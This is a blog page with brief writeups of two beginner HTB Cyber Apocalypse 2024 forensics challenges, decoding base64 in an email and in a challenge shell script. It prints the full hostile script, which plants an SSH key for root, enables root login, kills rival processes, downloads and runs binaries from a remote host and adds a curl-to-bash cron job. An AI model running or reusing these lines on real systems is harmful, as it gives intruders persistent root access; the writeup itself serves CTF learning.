<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=en-us dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>HTB CYBER-APOCALYPSE 2024 FORENSICS WRITEUPS - Stephenx0r - CTF Writeups</title><meta name=theme-color><meta name=description content='This is a writeup for forensics for HTB 2024
Urgent [Very Easy]
We are given an email file .eml file.
Printing out its contents we notice base64 encoding

Using  CyberChef we are able to decode the encoded string and its magic operation can detect the encoding also.
We get our flag.

It Has Begun [Very Easy]
We are given a script sh file
 1#!/bin/sh
 2
 3if [ "$HOSTNAME" != "KORP-STATION-013" ]; then
 4    exit
 5fi
 6
 7if [ "$EUID" -ne 0 ]; then
 8    exit
 9fi
10
11docker kill $(docker ps -q)
12docker rm $(docker ps -a -q)
13
14echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys
15echo "nameserver 8.8.8.8" >> /etc/resolv.conf
16echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
17echo "128.90.59.19 legions.korp.htb" >> /etc/hosts
18
19for filename in /proc/*; do
20    ex=$(ls -latrh $filename 2> /dev/null|grep exe)
21    if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew"; then
22        result=$(echo "$filename" | sed "s/\/proc\///")
23        kill -9 $result
24        echo found $filename $result
25    fi
26done
27
28ARCH=$(uname -m)
29array=("x86" "x86_64" "mips" "aarch64" "arm")
30
31if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then
32  exit
33fi
34
35
36cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 
37cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 
38cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;
39echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; " >> /etc/crontab
Upon analyzing the script  we see the username user@tS_u0y_ll1w{BTH and NG5kX3kwdVJfR3IwdU5kISF9 that look suspicious.'><meta name=author content="Stephenx0r - CTF Writeups"><link rel="preload stylesheet" as=style href=https://stephenx0r.github.io/main.min.css><link rel=preload as=image href=https://stephenx0r.github.io/theme.png><link rel=preload as=image href=https://stephenx0r.github.io/github.svg><link rel=preload as=image href=https://stephenx0r.github.io/linkedin.svg><script defer src=https://stephenx0r.github.io/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://stephenx0r.github.io/favicon.ico><link rel=apple-touch-icon href=https://stephenx0r.github.io/apple-touch-icon.png><meta name=generator content="Hugo 0.150.1"><meta itemprop=name content="HTB CYBER-APOCALYPSE 2024 FORENSICS WRITEUPS"><meta itemprop=description content='This is a writeup for forensics for HTB 2024
Urgent [Very Easy]
We are given an email file .eml file.
Printing out its contents we notice base64 encoding Using CyberChef we are able to decode the encoded string and its magic operation can detect the encoding also. We get our flag. It Has Begun [Very Easy] We are given a script sh file
1#!/bin/sh 2 3if [ "$HOSTNAME" != "KORP-STATION-013" ]; then 4 exit 5fi 6 7if [ "$EUID" -ne 0 ]; then 8 exit 9fi 10 11docker kill $(docker ps -q) 12docker rm $(docker ps -a -q) 13 14echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys 15echo "nameserver 8.8.8.8" >> /etc/resolv.conf 16echo "PermitRootLogin yes" >> /etc/ssh/sshd_config 17echo "128.90.59.19 legions.korp.htb" >> /etc/hosts 18 19for filename in /proc/*; do 20 ex=$(ls -latrh $filename 2> /dev/null|grep exe) 21 if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew"; then 22 result=$(echo "$filename" | sed "s/\/proc\///") 23 kill -9 $result 24 echo found $filename $result 25 fi 26done 27 28ARCH=$(uname -m) 29array=("x86" "x86_64" "mips" "aarch64" "arm") 30 31if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then 32 exit 33fi 34 35 36cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 37cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 38cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH; 39echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; " >> /etc/crontab Upon analyzing the script we see the username user@tS_u0y_ll1w{BTH and NG5kX3kwdVJfR3IwdU5kISF9 that look suspicious.'><meta itemprop=datePublished content="2024-03-17T07:00:00+00:00"><meta itemprop=dateModified content="2024-03-17T07:00:00+00:00"><meta itemprop=wordCount content="310"><meta itemprop=keywords content="Forensics,Htb"><meta property="og:url" content="https://stephenx0r.github.io/posts/2024-03-21-htbctf2024/"><meta property="og:site_name" content="Stephenx0r - CTF Writeups"><meta property="og:title" content="HTB CYBER-APOCALYPSE 2024 FORENSICS WRITEUPS"><meta property="og:description" content='This is a writeup for forensics for HTB 2024
Urgent [Very Easy]
We are given an email file .eml file.
Printing out its contents we notice base64 encoding Using CyberChef we are able to decode the encoded string and its magic operation can detect the encoding also. We get our flag. It Has Begun [Very Easy] We are given a script sh file
1#!/bin/sh 2 3if [ "$HOSTNAME" != "KORP-STATION-013" ]; then 4 exit 5fi 6 7if [ "$EUID" -ne 0 ]; then 8 exit 9fi 10 11docker kill $(docker ps -q) 12docker rm $(docker ps -a -q) 13 14echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys 15echo "nameserver 8.8.8.8" >> /etc/resolv.conf 16echo "PermitRootLogin yes" >> /etc/ssh/sshd_config 17echo "128.90.59.19 legions.korp.htb" >> /etc/hosts 18 19for filename in /proc/*; do 20 ex=$(ls -latrh $filename 2> /dev/null|grep exe) 21 if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew"; then 22 result=$(echo "$filename" | sed "s/\/proc\///") 23 kill -9 $result 24 echo found $filename $result 25 fi 26done 27 28ARCH=$(uname -m) 29array=("x86" "x86_64" "mips" "aarch64" "arm") 30 31if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then 32 exit 33fi 34 35 36cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 37cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 38cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH; 39echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; " >> /etc/crontab Upon analyzing the script we see the username user@tS_u0y_ll1w{BTH and NG5kX3kwdVJfR3IwdU5kISF9 that look suspicious.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-17T07:00:00+00:00"><meta property="article:modified_time" content="2024-03-17T07:00:00+00:00"><meta property="article:tag" content="Forensics"><meta property="article:tag" content="Htb"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB CYBER-APOCALYPSE 2024 FORENSICS WRITEUPS"><meta name=twitter:description content='This is a writeup for forensics for HTB 2024
Urgent [Very Easy]
We are given an email file .eml file.
Printing out its contents we notice base64 encoding Using CyberChef we are able to decode the encoded string and its magic operation can detect the encoding also. We get our flag. It Has Begun [Very Easy] We are given a script sh file
1#!/bin/sh 2 3if [ "$HOSTNAME" != "KORP-STATION-013" ]; then 4 exit 5fi 6 7if [ "$EUID" -ne 0 ]; then 8 exit 9fi 10 11docker kill $(docker ps -q) 12docker rm $(docker ps -a -q) 13 14echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys 15echo "nameserver 8.8.8.8" >> /etc/resolv.conf 16echo "PermitRootLogin yes" >> /etc/ssh/sshd_config 17echo "128.90.59.19 legions.korp.htb" >> /etc/hosts 18 19for filename in /proc/*; do 20 ex=$(ls -latrh $filename 2> /dev/null|grep exe) 21 if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew"; then 22 result=$(echo "$filename" | sed "s/\/proc\///") 23 kill -9 $result 24 echo found $filename $result 25 fi 26done 27 28ARCH=$(uname -m) 29array=("x86" "x86_64" "mips" "aarch64" "arm") 30 31if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then 32 exit 33fi 34 35 36cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 37cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 38cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH; 39echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; " >> /etc/crontab Upon analyzing the script we see the username user@tS_u0y_ll1w{BTH and NG5kX3kwdVJfR3IwdU5kISF9 that look suspicious.'><link rel=canonical href=https://stephenx0r.github.io/posts/2024-03-21-htbctf2024/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://stephenx0r.github.io/>Stephenx0r - CTF Writeups</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="mt-12 flex justify-center space-x-10 lg:mt-0 lg:items-center ltr:lg:ml-14 rtl:space-x-reverse rtl:lg:mr-14 dark:invert"><a class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6" style=--url:url(./github.svg) href=https://github.com/Stephenx0r target=_blank rel=me>github</a>
<a class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6" style=--url:url(./linkedin.svg) href=https://linkedin.com/in/stephengathumbi target=_blank rel=me>linkedin</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">HTB CYBER-APOCALYPSE 2024 FORENSICS WRITEUPS</h1><div class="text-xs antialiased opacity-60"><time>Mar 17, 2024</time></div></header><section><p>This is a writeup for forensics for HTB 2024</p><p>Urgent [Very Easy]</p><p>We are given an email file <code>.eml</code> file.</p><p>Printing out its contents we notice base64 encoding
<img src=/assets/posts/htbctfapocalpyse2024/eml.png alt=beginner1.png></p><p>Using <a href=https://gchq.github.io/CyberChef>CyberChef</a> we are able to decode the encoded string and its magic operation can detect the encoding also.
We get our flag.
<img src=/assets/posts/htbctfapocalpyse2024/cyberchef-eml.png alt=beginner1.png></p><p>It Has Begun [Very Easy]
We are given a script sh file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=ln> 1</span><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=cp></span>
</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$HOSTNAME</span><span class=s2>&#34;</span> !<span class=o>=</span> <span class=s2>&#34;KORP-STATION-013&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=nb>exit</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>
</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$EUID</span><span class=s2>&#34;</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=nb>exit</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>
</span></span><span class=line><span class=ln>11</span><span class=cl>docker <span class=nb>kill</span> <span class=k>$(</span>docker ps -q<span class=k>)</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>docker rm <span class=k>$(</span>docker ps -a -q<span class=k>)</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>
</span></span><span class=line><span class=ln>14</span><span class=cl><span class=nb>echo</span> <span class=s2>&#34;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH&#34;</span> &gt;&gt; /root/.ssh/authorized_keys
</span></span><span class=line><span class=ln>15</span><span class=cl><span class=nb>echo</span> <span class=s2>&#34;nameserver 8.8.8.8&#34;</span> &gt;&gt; /etc/resolv.conf
</span></span><span class=line><span class=ln>16</span><span class=cl><span class=nb>echo</span> <span class=s2>&#34;PermitRootLogin yes&#34;</span> &gt;&gt; /etc/ssh/sshd_config
</span></span><span class=line><span class=ln>17</span><span class=cl><span class=nb>echo</span> <span class=s2>&#34;128.90.59.19 legions.korp.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span><span class=line><span class=ln>18</span><span class=cl>
</span></span><span class=line><span class=ln>19</span><span class=cl><span class=k>for</span> filename in /proc/*<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>    <span class=nv>ex</span><span class=o>=</span><span class=k>$(</span>ls -latrh <span class=nv>$filename</span> 2&gt; /dev/null<span class=p>|</span>grep exe<span class=k>)</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>    <span class=k>if</span> <span class=nb>echo</span> <span class=nv>$ex</span> <span class=p>|</span>grep -q <span class=s2>&#34;/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew&#34;</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=nv>result</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span> <span class=p>|</span> sed <span class=s2>&#34;s/\/proc\///&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>        <span class=nb>kill</span> -9 <span class=nv>$result</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>        <span class=nb>echo</span> found <span class=nv>$filename</span> <span class=nv>$result</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=ln>26</span><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>
</span></span><span class=line><span class=ln>28</span><span class=cl><span class=nv>ARCH</span><span class=o>=</span><span class=k>$(</span>uname -m<span class=k>)</span>
</span></span><span class=line><span class=ln>29</span><span class=cl><span class=nv>array</span><span class=o>=(</span><span class=s2>&#34;x86&#34;</span> <span class=s2>&#34;x86_64&#34;</span> <span class=s2>&#34;mips&#34;</span> <span class=s2>&#34;aarch64&#34;</span> <span class=s2>&#34;arm&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>
</span></span><span class=line><span class=ln>31</span><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>array</span><span class=p>[@]</span><span class=si>}</span> <span class=p>|</span> grep -o <span class=s2>&#34;</span><span class=nv>$ARCH</span><span class=s2>&#34;</span> <span class=p>|</span> wc -w<span class=k>)</span> -eq <span class=m>0</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=ln>32</span><span class=cl>  <span class=nb>exit</span>
</span></span><span class=line><span class=ln>33</span><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=ln>34</span><span class=cl>
</span></span><span class=line><span class=ln>35</span><span class=cl>
</span></span><span class=line><span class=ln>36</span><span class=cl><span class=nb>cd</span> /tmp <span class=o>||</span> <span class=nb>cd</span> /var/ <span class=o>||</span> <span class=nb>cd</span> /mnt <span class=o>||</span> <span class=nb>cd</span> /root <span class=o>||</span> <span class=nb>cd</span> etc/init.d  <span class=o>||</span> <span class=nb>cd</span> /<span class=p>;</span> wget http://legions.korp.htb/0xda4.0xda4.<span class=nv>$ARCH</span><span class=p>;</span> chmod <span class=m>777</span> 0xda4.0xda4.<span class=nv>$ARCH</span><span class=p>;</span> ./0xda4.0xda4.<span class=nv>$ARCH</span><span class=p>;</span> 
</span></span><span class=line><span class=ln>37</span><span class=cl><span class=nb>cd</span> /tmp <span class=o>||</span> <span class=nb>cd</span> /var/ <span class=o>||</span> <span class=nb>cd</span> /mnt <span class=o>||</span> <span class=nb>cd</span> /root <span class=o>||</span> <span class=nb>cd</span> etc/init.d  <span class=o>||</span> <span class=nb>cd</span> /<span class=p>;</span> tftp legions.korp.htb -c get 0xda4.0xda4.<span class=nv>$ARCH</span><span class=p>;</span> cat 0xda4.0xda4.<span class=nv>$ARCH</span> &gt; DVRHelper<span class=p>;</span> chmod +x *<span class=p>;</span> ./DVRHelper <span class=nv>$ARCH</span><span class=p>;</span> 
</span></span><span class=line><span class=ln>38</span><span class=cl><span class=nb>cd</span> /tmp <span class=o>||</span> <span class=nb>cd</span> /var/ <span class=o>||</span> <span class=nb>cd</span> /mnt <span class=o>||</span> <span class=nb>cd</span> /root <span class=o>||</span> <span class=nb>cd</span> etc/init.d  <span class=o>||</span> <span class=nb>cd</span> /<span class=p>;</span> busybox wget http://legions.korp.htb/0xda4.0xda4.<span class=nv>$ARCH</span><span class=p>;</span> chmod 777<span class=p>;</span>./0xda4.0xda4.<span class=nv>$ARCH</span><span class=p>;</span>
</span></span><span class=line><span class=ln>39</span><span class=cl><span class=nb>echo</span> <span class=s2>&#34;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.</span><span class=nv>$ARCH</span><span class=s2> | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; &#34;</span> &gt;&gt; /etc/crontab
</span></span></code></pre></div><p>Upon analyzing the script we see the username user@tS_u0y_ll1w{BTH and NG5kX3kwdVJfR3IwdU5kISF9 that look suspicious.</p><p>Reversing the first string <code>user@tS_u0y_ll1w{BTH</code> and decoding the base64 string <code>NG5kX3kwdVJfR3IwdU5kISF9</code> we get our flag</p><p><img src=/assets/posts/htbctfapocalpyse2024/rev.png alt=beginner1.png></p></section><footer class="mt-12 flex flex-wrap"><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://stephenx0r.github.io/tags/forensics>forensics</a><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://stephenx0r.github.io/tags/htb>htb</a></footer><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://stephenx0r.github.io/posts/2024-03-17-wolvctf2024/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>WolvCTF 2024 - Writeups</span></a></nav></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>&copy;2025
<a class=link href=https://stephenx0r.github.io/>Stephenx0r - CTF Writeups</a></div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️
<a class=link href=https://github.com/nanxiaobei/hugo-paper rel=noopener target=_blank>hugo-paper</a></footer></body></html>